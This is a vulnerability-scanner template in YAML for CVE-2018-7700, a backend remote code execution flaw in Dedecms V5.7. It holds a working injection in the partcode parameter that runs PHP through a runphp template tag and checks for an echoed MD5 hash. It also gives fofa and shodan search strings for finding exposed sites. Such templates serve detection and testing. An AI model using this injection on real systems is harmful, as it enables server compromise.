id: CVE-2018-7700

info:
  name: Dedecms V5.7 后台任意代码执行
  author: harris2015
  severity: high
  description: |-
    Dedecms V5.7 后台任意代码执行
    fofa: app="Dedecms"
    shodan: http.html:"Dedecms"
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2018-7700
  tags: cve,cve2018,dedecms,rce
  created: 2023/08/10

set:
  r: randomInt(2000000000, 2100000000)
rules:
  r0:
    request:
      method: GET
      path: /tag_test_action.php?url=a&token=&partcode={dede:field%20name=%27source%27%20runphp=%27yes%27}echo%20md5{{r}};{/dede:field}
      follow_redirects: true
    expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r))))
expression: r0()
